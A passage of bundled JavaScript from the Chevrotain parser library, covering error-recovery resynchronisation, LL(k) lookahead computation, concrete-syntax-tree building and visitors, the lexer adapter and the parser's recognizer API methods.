      // It does not make any sense to include a virtual EOF token in the list of resynced tokens
      // as EOF does not really exist and thus does not contain any useful information (line/column numbers)
      addToResyncTokens(token, resyncTokens) {
        if (!this.tokenMatcher(token, EOF)) {
          resyncTokens.push(token);
        }
        return resyncTokens;
      }
      reSyncTo(tokType) {
        const resyncedTokens = [];
        let nextTok = this.LA(1);
        while (this.tokenMatcher(nextTok, tokType) === false) {
          nextTok = this.SKIP_TOKEN();
          this.addToResyncTokens(nextTok, resyncedTokens);
        }
        return dropRight_default(resyncedTokens);
      }
      attemptInRepetitionRecovery(prodFunc, args2, lookaheadFunc, dslMethodIdx, prodOccurrence, nextToksWalker, notStuck) {
      }
      getCurrentGrammarPath(tokType, tokIdxInRule) {
        const pathRuleStack = this.getHumanReadableRuleStack();
        const pathOccurrenceStack = clone_default(this.RULE_OCCURRENCE_STACK);
        const grammarPath = {
          ruleStack: pathRuleStack,
          occurrenceStack: pathOccurrenceStack,
          lastTok: tokType,
          lastTokOccurrence: tokIdxInRule
        };
        return grammarPath;
      }
      getHumanReadableRuleStack() {
        return map_default(this.RULE_STACK, (currShortName) => this.shortRuleNameToFullName(currShortName));
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/keys.js
function getKeyForAutomaticLookahead(ruleIdx, dslMethodIdx, occurrence) {
  return occurrence | dslMethodIdx | ruleIdx;
}
var BITS_FOR_METHOD_TYPE, BITS_FOR_OCCURRENCE_IDX, BITS_FOR_ALT_IDX, OR_IDX, OPTION_IDX, MANY_IDX, AT_LEAST_ONE_IDX, MANY_SEP_IDX, AT_LEAST_ONE_SEP_IDX, BITS_START_FOR_ALT_IDX;
var init_keys2 = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/keys.js"() {
    BITS_FOR_METHOD_TYPE = 4;
    BITS_FOR_OCCURRENCE_IDX = 8;
    BITS_FOR_ALT_IDX = 8;
    OR_IDX = 1 << BITS_FOR_OCCURRENCE_IDX;
    OPTION_IDX = 2 << BITS_FOR_OCCURRENCE_IDX;
    MANY_IDX = 3 << BITS_FOR_OCCURRENCE_IDX;
    AT_LEAST_ONE_IDX = 4 << BITS_FOR_OCCURRENCE_IDX;
    MANY_SEP_IDX = 5 << BITS_FOR_OCCURRENCE_IDX;
    AT_LEAST_ONE_SEP_IDX = 6 << BITS_FOR_OCCURRENCE_IDX;
    BITS_START_FOR_ALT_IDX = 32 - BITS_FOR_ALT_IDX;
  }
});

// node_modules/chevrotain/lib/src/parse/grammar/llk_lookahead.js
var LLkLookaheadStrategy;
var init_llk_lookahead = __esm({
  "node_modules/chevrotain/lib/src/parse/grammar/llk_lookahead.js"() {
    init_lodash();
    init_errors_public();
    init_parser();
    init_checks();
    init_lookahead();
    LLkLookaheadStrategy = class {
      constructor(options) {
        var _a;
        this.maxLookahead = (_a = options === null || options === void 0 ? void 0 : options.maxLookahead) !== null && _a !== void 0 ? _a : DEFAULT_PARSER_CONFIG.maxLookahead;
      }
      validate(options) {
        const leftRecursionErrors = this.validateNoLeftRecursion(options.rules);
        if (isEmpty_default(leftRecursionErrors)) {
          const emptyAltErrors = this.validateEmptyOrAlternatives(options.rules);
          const ambiguousAltsErrors = this.validateAmbiguousAlternationAlternatives(options.rules, this.maxLookahead);
          const emptyRepetitionErrors = this.validateSomeNonEmptyLookaheadPath(options.rules, this.maxLookahead);
          const allErrors = [
            ...leftRecursionErrors,
            ...emptyAltErrors,
            ...ambiguousAltsErrors,
            ...emptyRepetitionErrors
          ];
          return allErrors;
        }
        return leftRecursionErrors;
      }
      validateNoLeftRecursion(rules) {
        return flatMap_default(rules, (currTopRule) => validateNoLeftRecursion(currTopRule, currTopRule, defaultGrammarValidatorErrorProvider));
      }
      validateEmptyOrAlternatives(rules) {
        return flatMap_default(rules, (currTopRule) => validateEmptyOrAlternative(currTopRule, defaultGrammarValidatorErrorProvider));
      }
      validateAmbiguousAlternationAlternatives(rules, maxLookahead) {
        return flatMap_default(rules, (currTopRule) => validateAmbiguousAlternationAlternatives(currTopRule, maxLookahead, defaultGrammarValidatorErrorProvider));
      }
      validateSomeNonEmptyLookaheadPath(rules, maxLookahead) {
        return validateSomeNonEmptyLookaheadPath(rules, maxLookahead, defaultGrammarValidatorErrorProvider);
      }
      buildLookaheadForAlternation(options) {
        return buildLookaheadFuncForOr(options.prodOccurrence, options.rule, options.maxLookahead, options.hasPredicates, options.dynamicTokensEnabled, buildAlternativesLookAheadFunc);
      }
      buildLookaheadForOptional(options) {
        return buildLookaheadFuncForOptionalProd(options.prodOccurrence, options.rule, options.maxLookahead, options.dynamicTokensEnabled, getProdType(options.prodType), buildSingleAlternativeLookaheadFunction);
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/looksahead.js
function collectMethods(rule) {
  collectorVisitor.reset();
  rule.accept(collectorVisitor);
  const dslMethods = collectorVisitor.dslMethods;
  collectorVisitor.reset();
  return dslMethods;
}
var LooksAhead, DslMethodsCollectorVisitor, collectorVisitor;
var init_looksahead = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/looksahead.js"() {
    init_lodash();
    init_parser();
    init_keys2();
    init_api2();
    init_llk_lookahead();
    LooksAhead = class {
      initLooksAhead(config) {
        this.dynamicTokensEnabled = has_default(config, "dynamicTokensEnabled") ? config.dynamicTokensEnabled : DEFAULT_PARSER_CONFIG.dynamicTokensEnabled;
        this.maxLookahead = has_default(config, "maxLookahead") ? config.maxLookahead : DEFAULT_PARSER_CONFIG.maxLookahead;
        this.lookaheadStrategy = has_default(config, "lookaheadStrategy") ? config.lookaheadStrategy : new LLkLookaheadStrategy({ maxLookahead: this.maxLookahead });
        this.lookAheadFuncsCache = /* @__PURE__ */ new Map();
      }
      preComputeLookaheadFunctions(rules) {
        forEach_default(rules, (currRule) => {
          this.TRACE_INIT(`${currRule.name} Rule Lookahead`, () => {
            const { alternation, repetition, option, repetitionMandatory, repetitionMandatoryWithSeparator, repetitionWithSeparator } = collectMethods(currRule);
            forEach_default(alternation, (currProd) => {
              const prodIdx = currProd.idx === 0 ? "" : currProd.idx;
              this.TRACE_INIT(`${getProductionDslName(currProd)}${prodIdx}`, () => {
                const laFunc = this.lookaheadStrategy.buildLookaheadForAlternation({
                  prodOccurrence: currProd.idx,
                  rule: currRule,
                  maxLookahead: currProd.maxLookahead || this.maxLookahead,
                  hasPredicates: currProd.hasPredicates,
                  dynamicTokensEnabled: this.dynamicTokensEnabled
                });
                const key = getKeyForAutomaticLookahead(this.fullRuleNameToShort[currRule.name], OR_IDX, currProd.idx);
                this.setLaFuncCache(key, laFunc);
              });
            });
            forEach_default(repetition, (currProd) => {
              this.computeLookaheadFunc(currRule, currProd.idx, MANY_IDX, "Repetition", currProd.maxLookahead, getProductionDslName(currProd));
            });
            forEach_default(option, (currProd) => {
              this.computeLookaheadFunc(currRule, currProd.idx, OPTION_IDX, "Option", currProd.maxLookahead, getProductionDslName(currProd));
            });
            forEach_default(repetitionMandatory, (currProd) => {
              this.computeLookaheadFunc(currRule, currProd.idx, AT_LEAST_ONE_IDX, "RepetitionMandatory", currProd.maxLookahead, getProductionDslName(currProd));
            });
            forEach_default(repetitionMandatoryWithSeparator, (currProd) => {
              this.computeLookaheadFunc(currRule, currProd.idx, AT_LEAST_ONE_SEP_IDX, "RepetitionMandatoryWithSeparator", currProd.maxLookahead, getProductionDslName(currProd));
            });
            forEach_default(repetitionWithSeparator, (currProd) => {
              this.computeLookaheadFunc(currRule, currProd.idx, MANY_SEP_IDX, "RepetitionWithSeparator", currProd.maxLookahead, getProductionDslName(currProd));
            });
          });
        });
      }
      computeLookaheadFunc(rule, prodOccurrence, prodKey, prodType, prodMaxLookahead, dslMethodName) {
        this.TRACE_INIT(`${dslMethodName}${prodOccurrence === 0 ? "" : prodOccurrence}`, () => {
          const laFunc = this.lookaheadStrategy.buildLookaheadForOptional({
            prodOccurrence,
            rule,
            maxLookahead: prodMaxLookahead || this.maxLookahead,
            dynamicTokensEnabled: this.dynamicTokensEnabled,
            prodType
          });
          const key = getKeyForAutomaticLookahead(this.fullRuleNameToShort[rule.name], prodKey, prodOccurrence);
          this.setLaFuncCache(key, laFunc);
        });
      }
      // this actually returns a number, but it is always used as a string (object prop key)
      getKeyForAutomaticLookahead(dslMethodIdx, occurrence) {
        const currRuleShortName = this.getLastExplicitRuleShortName();
        return getKeyForAutomaticLookahead(currRuleShortName, dslMethodIdx, occurrence);
      }
      getLaFuncFromCache(key) {
        return this.lookAheadFuncsCache.get(key);
      }
      /* istanbul ignore next */
      setLaFuncCache(key, value) {
        this.lookAheadFuncsCache.set(key, value);
      }
    };
    DslMethodsCollectorVisitor = class extends GAstVisitor {
      constructor() {
        super(...arguments);
        this.dslMethods = {
          option: [],
          alternation: [],
          repetition: [],
          repetitionWithSeparator: [],
          repetitionMandatory: [],
          repetitionMandatoryWithSeparator: []
        };
      }
      reset() {
        this.dslMethods = {
          option: [],
          alternation: [],
          repetition: [],
          repetitionWithSeparator: [],
          repetitionMandatory: [],
          repetitionMandatoryWithSeparator: []
        };
      }
      visitOption(option) {
        this.dslMethods.option.push(option);
      }
      visitRepetitionWithSeparator(manySep) {
        this.dslMethods.repetitionWithSeparator.push(manySep);
      }
      visitRepetitionMandatory(atLeastOne) {
        this.dslMethods.repetitionMandatory.push(atLeastOne);
      }
      visitRepetitionMandatoryWithSeparator(atLeastOneSep) {
        this.dslMethods.repetitionMandatoryWithSeparator.push(atLeastOneSep);
      }
      visitRepetition(many) {
        this.dslMethods.repetition.push(many);
      }
      visitAlternation(or) {
        this.dslMethods.alternation.push(or);
      }
    };
    collectorVisitor = new DslMethodsCollectorVisitor();
  }
});

// node_modules/chevrotain/lib/src/parse/cst/cst.js
function setNodeLocationOnlyOffset(currNodeLocation, newLocationInfo) {
  if (isNaN(currNodeLocation.startOffset) === true) {
    currNodeLocation.startOffset = newLocationInfo.startOffset;
    currNodeLocation.endOffset = newLocationInfo.endOffset;
  } else if (currNodeLocation.endOffset < newLocationInfo.endOffset === true) {
    currNodeLocation.endOffset = newLocationInfo.endOffset;
  }
}
function setNodeLocationFull(currNodeLocation, newLocationInfo) {
  if (isNaN(currNodeLocation.startOffset) === true) {
    currNodeLocation.startOffset = newLocationInfo.startOffset;
    currNodeLocation.startColumn = newLocationInfo.startColumn;
    currNodeLocation.startLine = newLocationInfo.startLine;
    currNodeLocation.endOffset = newLocationInfo.endOffset;
    currNodeLocation.endColumn = newLocationInfo.endColumn;
    currNodeLocation.endLine = newLocationInfo.endLine;
  } else if (currNodeLocation.endOffset < newLocationInfo.endOffset === true) {
    currNodeLocation.endOffset = newLocationInfo.endOffset;
    currNodeLocation.endColumn = newLocationInfo.endColumn;
    currNodeLocation.endLine = newLocationInfo.endLine;
  }
}
function addTerminalToCst(node, token, tokenTypeName) {
  if (node.children[tokenTypeName] === void 0) {
    node.children[tokenTypeName] = [token];
  } else {
    node.children[tokenTypeName].push(token);
  }
}
function addNoneTerminalToCst(node, ruleName, ruleResult) {
  if (node.children[ruleName] === void 0) {
    node.children[ruleName] = [ruleResult];
  } else {
    node.children[ruleName].push(ruleResult);
  }
}
var init_cst = __esm({
  "node_modules/chevrotain/lib/src/parse/cst/cst.js"() {
  }
});

// node_modules/chevrotain/lib/src/lang/lang_extensions.js
function defineNameProp(obj, nameValue) {
  Object.defineProperty(obj, NAME, {
    enumerable: false,
    configurable: true,
    writable: false,
    value: nameValue
  });
}
var NAME;
var init_lang_extensions = __esm({
  "node_modules/chevrotain/lib/src/lang/lang_extensions.js"() {
    NAME = "name";
  }
});

// node_modules/chevrotain/lib/src/parse/cst/cst_visitor.js
function defaultVisit(ctx, param) {
  const childrenNames = keys_default(ctx);
  const childrenNamesLength = childrenNames.length;
  for (let i = 0; i < childrenNamesLength; i++) {
    const currChildName = childrenNames[i];
    const currChildArray = ctx[currChildName];
    const currChildArrayLength = currChildArray.length;
    for (let j = 0; j < currChildArrayLength; j++) {
      const currChild = currChildArray[j];
      if (currChild.tokenTypeIdx === void 0) {
        this[currChild.name](currChild.children, param);
      }
    }
  }
}
function createBaseSemanticVisitorConstructor(grammarName, ruleNames) {
  const derivedConstructor = function() {
  };
  defineNameProp(derivedConstructor, grammarName + "BaseSemantics");
  const semanticProto = {
    visit: function(cstNode, param) {
      if (isArray_default(cstNode)) {
        cstNode = cstNode[0];
      }
      if (isUndefined_default(cstNode)) {
        return void 0;
      }
      return this[cstNode.name](cstNode.children, param);
    },
    validateVisitor: function() {
      const semanticDefinitionErrors = validateVisitor(this, ruleNames);
      if (!isEmpty_default(semanticDefinitionErrors)) {
        const errorMessages = map_default(semanticDefinitionErrors, (currDefError) => currDefError.msg);
        throw Error(`Errors Detected in CST Visitor <${this.constructor.name}>:
	${errorMessages.join("\n\n").replace(/\n/g, "\n	")}`);
      }
    }
  };
  derivedConstructor.prototype = semanticProto;
  derivedConstructor.prototype.constructor = derivedConstructor;
  derivedConstructor._RULE_NAMES = ruleNames;
  return derivedConstructor;
}
function createBaseVisitorConstructorWithDefaults(grammarName, ruleNames, baseConstructor) {
  const derivedConstructor = function() {
  };
  defineNameProp(derivedConstructor, grammarName + "BaseSemanticsWithDefaults");
  const withDefaultsProto = Object.create(baseConstructor.prototype);
  forEach_default(ruleNames, (ruleName) => {
    withDefaultsProto[ruleName] = defaultVisit;
  });
  derivedConstructor.prototype = withDefaultsProto;
  derivedConstructor.prototype.constructor = derivedConstructor;
  return derivedConstructor;
}
function validateVisitor(visitorInstance, ruleNames) {
  const missingErrors = validateMissingCstMethods(visitorInstance, ruleNames);
  return missingErrors;
}
function validateMissingCstMethods(visitorInstance, ruleNames) {
  const missingRuleNames = filter_default(ruleNames, (currRuleName) => {
    return isFunction_default(visitorInstance[currRuleName]) === false;
  });
  const errors = map_default(missingRuleNames, (currRuleName) => {
    return {
      msg: `Missing visitor method: <${currRuleName}> on ${visitorInstance.constructor.name} CST Visitor.`,
      type: CstVisitorDefinitionError.MISSING_METHOD,
      methodName: currRuleName
    };
  });
  return compact_default(errors);
}
var CstVisitorDefinitionError;
var init_cst_visitor = __esm({
  "node_modules/chevrotain/lib/src/parse/cst/cst_visitor.js"() {
    init_lodash();
    init_lang_extensions();
    (function(CstVisitorDefinitionError2) {
      CstVisitorDefinitionError2[CstVisitorDefinitionError2["REDUNDANT_METHOD"] = 0] = "REDUNDANT_METHOD";
      CstVisitorDefinitionError2[CstVisitorDefinitionError2["MISSING_METHOD"] = 1] = "MISSING_METHOD";
    })(CstVisitorDefinitionError || (CstVisitorDefinitionError = {}));
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/tree_builder.js
var TreeBuilder;
var init_tree_builder = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/tree_builder.js"() {
    init_cst();
    init_lodash();
    init_cst_visitor();
    init_parser();
    TreeBuilder = class {
      initTreeBuilder(config) {
        this.CST_STACK = [];
        this.outputCst = config.outputCst;
        this.nodeLocationTracking = has_default(config, "nodeLocationTracking") ? config.nodeLocationTracking : DEFAULT_PARSER_CONFIG.nodeLocationTracking;
        if (!this.outputCst) {
          this.cstInvocationStateUpdate = noop_default;
          this.cstFinallyStateUpdate = noop_default;
          this.cstPostTerminal = noop_default;
          this.cstPostNonTerminal = noop_default;
          this.cstPostRule = noop_default;
        } else {
          if (/full/i.test(this.nodeLocationTracking)) {
            if (this.recoveryEnabled) {
              this.setNodeLocationFromToken = setNodeLocationFull;
              this.setNodeLocationFromNode = setNodeLocationFull;
              this.cstPostRule = noop_default;
              this.setInitialNodeLocation = this.setInitialNodeLocationFullRecovery;
            } else {
              this.setNodeLocationFromToken = noop_default;
              this.setNodeLocationFromNode = noop_default;
              this.cstPostRule = this.cstPostRuleFull;
              this.setInitialNodeLocation = this.setInitialNodeLocationFullRegular;
            }
          } else if (/onlyOffset/i.test(this.nodeLocationTracking)) {
            if (this.recoveryEnabled) {
              this.setNodeLocationFromToken = setNodeLocationOnlyOffset;
              this.setNodeLocationFromNode = setNodeLocationOnlyOffset;
              this.cstPostRule = noop_default;
              this.setInitialNodeLocation = this.setInitialNodeLocationOnlyOffsetRecovery;
            } else {
              this.setNodeLocationFromToken = noop_default;
              this.setNodeLocationFromNode = noop_default;
              this.cstPostRule = this.cstPostRuleOnlyOffset;
              this.setInitialNodeLocation = this.setInitialNodeLocationOnlyOffsetRegular;
            }
          } else if (/none/i.test(this.nodeLocationTracking)) {
            this.setNodeLocationFromToken = noop_default;
            this.setNodeLocationFromNode = noop_default;
            this.cstPostRule = noop_default;
            this.setInitialNodeLocation = noop_default;
          } else {
            throw Error(`Invalid <nodeLocationTracking> config option: "${config.nodeLocationTracking}"`);
          }
        }
      }
      setInitialNodeLocationOnlyOffsetRecovery(cstNode) {
        cstNode.location = {
          startOffset: NaN,
          endOffset: NaN
        };
      }
      setInitialNodeLocationOnlyOffsetRegular(cstNode) {
        cstNode.location = {
          // without error recovery the starting Location of a new CstNode is guaranteed
          // To be the next Token's startOffset (for valid inputs).
          // For invalid inputs there won't be any CSTOutput so this potential
          // inaccuracy does not matter
          startOffset: this.LA(1).startOffset,
          endOffset: NaN
        };
      }
      setInitialNodeLocationFullRecovery(cstNode) {
        cstNode.location = {
          startOffset: NaN,
          startLine: NaN,
          startColumn: NaN,
          endOffset: NaN,
          endLine: NaN,
          endColumn: NaN
        };
      }
      /**
           *  @see setInitialNodeLocationOnlyOffsetRegular for explanation why this work
      
           * @param cstNode
           */
      setInitialNodeLocationFullRegular(cstNode) {
        const nextToken = this.LA(1);
        cstNode.location = {
          startOffset: nextToken.startOffset,
          startLine: nextToken.startLine,
          startColumn: nextToken.startColumn,
          endOffset: NaN,
          endLine: NaN,
          endColumn: NaN
        };
      }
      cstInvocationStateUpdate(fullRuleName) {
        const cstNode = {
          name: fullRuleName,
          children: /* @__PURE__ */ Object.create(null)
        };
        this.setInitialNodeLocation(cstNode);
        this.CST_STACK.push(cstNode);
      }
      cstFinallyStateUpdate() {
        this.CST_STACK.pop();
      }
      cstPostRuleFull(ruleCstNode) {
        const prevToken = this.LA(0);
        const loc = ruleCstNode.location;
        if (loc.startOffset <= prevToken.startOffset === true) {
          loc.endOffset = prevToken.endOffset;
          loc.endLine = prevToken.endLine;
          loc.endColumn = prevToken.endColumn;
        } else {
          loc.startOffset = NaN;
          loc.startLine = NaN;
          loc.startColumn = NaN;
        }
      }
      cstPostRuleOnlyOffset(ruleCstNode) {
        const prevToken = this.LA(0);
        const loc = ruleCstNode.location;
        if (loc.startOffset <= prevToken.startOffset === true) {
          loc.endOffset = prevToken.endOffset;
        } else {
          loc.startOffset = NaN;
        }
      }
      cstPostTerminal(key, consumedToken) {
        const rootCst = this.CST_STACK[this.CST_STACK.length - 1];
        addTerminalToCst(rootCst, consumedToken, key);
        this.setNodeLocationFromToken(rootCst.location, consumedToken);
      }
      cstPostNonTerminal(ruleCstResult, ruleName) {
        const preCstNode = this.CST_STACK[this.CST_STACK.length - 1];
        addNoneTerminalToCst(preCstNode, ruleName, ruleCstResult);
        this.setNodeLocationFromNode(preCstNode.location, ruleCstResult.location);
      }
      getBaseCstVisitorConstructor() {
        if (isUndefined_default(this.baseCstVisitorConstructor)) {
          const newBaseCstVisitorConstructor = createBaseSemanticVisitorConstructor(this.className, keys_default(this.gastProductionsCache));
          this.baseCstVisitorConstructor = newBaseCstVisitorConstructor;
          return newBaseCstVisitorConstructor;
        }
        return this.baseCstVisitorConstructor;
      }
      getBaseCstVisitorConstructorWithDefaults() {
        if (isUndefined_default(this.baseCstVisitorWithDefaultsConstructor)) {
          const newConstructor = createBaseVisitorConstructorWithDefaults(this.className, keys_default(this.gastProductionsCache), this.getBaseCstVisitorConstructor());
          this.baseCstVisitorWithDefaultsConstructor = newConstructor;
          return newConstructor;
        }
        return this.baseCstVisitorWithDefaultsConstructor;
      }
      getLastExplicitRuleShortName() {
        const ruleStack = this.RULE_STACK;
        return ruleStack[ruleStack.length - 1];
      }
      getPreviousExplicitRuleShortName() {
        const ruleStack = this.RULE_STACK;
        return ruleStack[ruleStack.length - 2];
      }
      getLastExplicitRuleOccurrenceIndex() {
        const occurrenceStack = this.RULE_OCCURRENCE_STACK;
        return occurrenceStack[occurrenceStack.length - 1];
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/lexer_adapter.js
var LexerAdapter;
var init_lexer_adapter = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/lexer_adapter.js"() {
    init_parser();
    LexerAdapter = class {
      initLexerAdapter() {
        this.tokVector = [];
        this.tokVectorLength = 0;
        this.currIdx = -1;
      }
      set input(newInput) {
        if (this.selfAnalysisDone !== true) {
          throw Error(`Missing <performSelfAnalysis> invocation at the end of the Parser's constructor.`);
        }
        this.reset();
        this.tokVector = newInput;
        this.tokVectorLength = newInput.length;
      }
      get input() {
        return this.tokVector;
      }
      // skips a token and returns the next token
      SKIP_TOKEN() {
        if (this.currIdx <= this.tokVector.length - 2) {
          this.consumeToken();
          return this.LA(1);
        } else {
          return END_OF_FILE;
        }
      }
      // Lexer (accessing Token vector) related methods which can be overridden to implement lazy lexers
      // or lexers dependent on parser context.
      LA(howMuch) {
        const soughtIdx = this.currIdx + howMuch;
        if (soughtIdx < 0 || this.tokVectorLength <= soughtIdx) {
          return END_OF_FILE;
        } else {
          return this.tokVector[soughtIdx];
        }
      }
      consumeToken() {
        this.currIdx++;
      }
      exportLexerState() {
        return this.currIdx;
      }
      importLexerState(newState) {
        this.currIdx = newState;
      }
      resetLexerState() {
        this.currIdx = -1;
      }
      moveToTerminatedState() {
        this.currIdx = this.tokVector.length - 1;
      }
      getLexerPosition() {
        return this.exportLexerState();
      }
    };
  }
});

// node_modules/chevrotain/lib/src/parse/parser/traits/recognizer_api.js
var RecognizerApi;
var init_recognizer_api = __esm({
  "node_modules/chevrotain/lib/src/parse/parser/traits/recognizer_api.js"() {
    init_lodash();
    init_exceptions_public();
    init_parser();
    init_errors_public();
    init_checks();
    init_api2();
    RecognizerApi = class {
      ACTION(impl) {
        return impl.call(this);
      }
      consume(idx, tokType, options) {
        return this.consumeInternal(tokType, idx, options);
      }
      subrule(idx, ruleToCall, options) {
        return this.subruleInternal(ruleToCall, idx, options);
      }
      option(idx, actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, idx);
      }
      or(idx, altsOrOpts) {
        return this.orInternal(altsOrOpts, idx);
      }
      many(idx, actionORMethodDef) {
        return this.manyInternal(idx, actionORMethodDef);
      }
      atLeastOne(idx, actionORMethodDef) {
        return this.atLeastOneInternal(idx, actionORMethodDef);
      }
      CONSUME(tokType, options) {
        return this.consumeInternal(tokType, 0, options);
      }
      CONSUME1(tokType, options) {
        return this.consumeInternal(tokType, 1, options);
      }
      CONSUME2(tokType, options) {
        return this.consumeInternal(tokType, 2, options);
      }
      CONSUME3(tokType, options) {
        return this.consumeInternal(tokType, 3, options);
      }
      CONSUME4(tokType, options) {
        return this.consumeInternal(tokType, 4, options);
      }
      CONSUME5(tokType, options) {
        return this.consumeInternal(tokType, 5, options);
      }
      CONSUME6(tokType, options) {
        return this.consumeInternal(tokType, 6, options);
      }
      CONSUME7(tokType, options) {
        return this.consumeInternal(tokType, 7, options);
      }
      CONSUME8(tokType, options) {
        return this.consumeInternal(tokType, 8, options);
      }
      CONSUME9(tokType, options) {
        return this.consumeInternal(tokType, 9, options);
      }
      SUBRULE(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 0, options);
      }
      SUBRULE1(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 1, options);
      }
      SUBRULE2(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 2, options);
      }
      SUBRULE3(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 3, options);
      }
      SUBRULE4(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 4, options);
      }
      SUBRULE5(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 5, options);
      }
      SUBRULE6(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 6, options);
      }
      SUBRULE7(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 7, options);
      }
      SUBRULE8(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 8, options);
      }
      SUBRULE9(ruleToCall, options) {
        return this.subruleInternal(ruleToCall, 9, options);
      }
      OPTION(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 0);
      }
      OPTION1(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 1);
      }
      OPTION2(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 2);
      }
      OPTION3(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 3);
      }
      OPTION4(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 4);
      }
      OPTION5(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 5);
      }
      OPTION6(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 6);
      }
      OPTION7(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 7);
      }
      OPTION8(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 8);
      }
      OPTION9(actionORMethodDef) {
        return this.optionInternal(actionORMethodDef, 9);
      }
      OR(altsOrOpts) {
        return this.orInternal(altsOrOpts, 0);
      }
      OR1(altsOrOpts) {
        return this.orInternal(altsOrOpts, 1);
      }
      OR2(altsOrOpts) {
        return this.orInternal(altsOrOpts, 2);
      }
      OR3(altsOrOpts) {
        return this.orInternal(altsOrOpts, 3);
      }
      OR4(altsOrOpts) {
        return this.orInternal(altsOrOpts, 4);
      }
      OR5(altsOrOpts) {
        return this.orInternal(altsOrOpts, 5);
      }
      OR6(altsOrOpts) {
        return this.orInternal(altsOrOpts, 6);
      }
      OR7(altsOrOpts) {
        return this.orInternal(altsOrOpts, 7);
      }
      OR8(altsOrOpts) {
        return this.orInternal(altsOrOpts, 8);
      }
      OR9(altsOrOpts) {
        return this.orInternal(altsOrOpts, 9);
      }
      MANY(actionORMethodDef) {
        this.manyInternal(0, actionORMethodDef);
      }
      MANY1(actionORMethodDef) {
        this.manyInternal(1, actionORMethodDef);
      }
      MANY2(actionORMethodDef) {
        this.manyInternal(2, actionORMethodDef);
      }
      MANY3(actionORMethodDef) {
        this.manyInternal(3, actionORMethodDef);
      }
      MANY4(actionORMethodDef) {
        this.manyInternal(4, actionORMethodDef);
      }
      MANY5(actionORMethodDef) {
        this.manyInternal(5, actionORMethodDef);
      }
      MANY6(actionORMethodDef) {
        this.manyInternal(6, actionORMethodDef);
      }
      MANY7(actionORMethodDef) {
        this.manyInternal(7, actionORMethodDef);
      }
      MANY8(actionORMethodDef) {
        this.manyInternal(8, actionORMethodDef);
      }
      MANY9(actionORMethodDef) {
        this.manyInternal(9, actionORMethodDef);
      }
      MANY_SEP(options) {
        this.manySepFirstInternal(0, options);
      }
      MANY_SEP1(options) {
        this.manySepFirstInternal(1, options);
      }
      MANY_SEP2(options) {
        this.manySepFirstInternal(2, options);
      }
      MANY_SEP3(options) {
        this.manySepFirstInternal(3, options);
      }
      MANY_SEP4(options) {
        this.manySepFirstInternal(4, options);
      }
      MANY_SEP5(options) {
        this.manySepFirstInternal(5, options);
      }
      MANY_SEP6(options) {
        this.manySepFirstInternal(6, options);
      }
      MANY_SEP7(options) {
        this.manySepFirstInternal(7, options);
      }
      MANY_SEP8(options) {
        this.manySepFirstInternal(8, options);
      }
      MANY_SEP9(options) {
        this.manySepFirstInternal(9, options);
      }
      AT_LEAST_ONE(actionORMethodDef) {
        this.atLeastOneInternal(0, actionORMethodDef);
      }
      AT_LEAST_ONE1(actionORMethodDef) {
        return this.atLeastOneInternal(1, actionORMethodDef);
      }
      AT_LEAST_ONE2(actionORMethodDef) {
        this.atLeastOneInternal(2, actionORMethodDef);
      }
      AT_LEAST_ONE3(actionORMethodDef) {
        this.atLeastOneInternal(3, actionORMethodDef);
      }
      AT_LEAST_ONE4(actionORMethodDef) {
        this.atLeastOneInternal(4, actionORMethodDef);
      }
      AT_LEAST_ONE5(actionORMethodDef) {
        this.atLeastOneInternal(5, actionORMethodDef);
      }
      AT_LEAST_ONE6(actionORMethodDef) {
        this.atLeastOneInternal(6, actionORMethodDef);
      }
      AT_LEAST_ONE7(actionORMethodDef) {
        this.atLeastOneInternal(7, actionORMethodDef);
      }
      AT_LEAST_ONE8(actionORMethodDef) {
        this.atLeastOneInternal(8, actionORMethodDef);
      }
      AT_LEAST_ONE9(actionORMethodDef) {
        this.atLeastOneInternal(9, actionORMethodDef);
      }
      AT_LEAST_ONE_SEP(options) {
        this.atLeastOneSepFirstInternal(0, options);
      }
      AT_LEAST_ONE_SEP1(options) {
        this.atLeastOneSepFirstInternal(1, options);
      }
      AT_LEAST_ONE_SEP2(options) {
        this.atLeastOneSepFirstInternal(2, options);
      }
      AT_LEAST_ONE_SEP3(options) {
        this.atLeastOneSepFirstInternal(3, options);
      }
      AT_LEAST_ONE_SEP4(options) {
        this.atLeastOneSepFirstInternal(4, options);
      }
      AT_LEAST_ONE_SEP5(options) {
        this.atLeastOneSepFirstInternal(5, options);
      }
      AT_LEAST_ONE_SEP6(options) {
        this.atLeastOneSepFirstInternal(6, options);
      }
      AT_LEAST_ONE_SEP7(options) {
        this.atLeastOneSepFirstInternal(7, options);
      }
      AT_LEAST_ONE_SEP8(options) {
        this.atLeastOneSepFirstInternal(8, options);
      }
      AT_LEAST_ONE_SEP9(options) {
        this.atLeastOneSepFirstInternal(9, options);
      }
      RULE(name, implementation, config = DEFAULT_RULE_CONFIG) {
        if (includes_default(this.definedRulesNames, name)) {
          const errMsg = defaultGrammarValidatorErrorProvider.buildDuplicateRuleNameError({
            topLevelRule: name,
            grammarName: this.className
          });
          const error = {
            message: errMsg,
            type: ParserDefinitionErrorType.DUPLICATE_RULE_NAME,
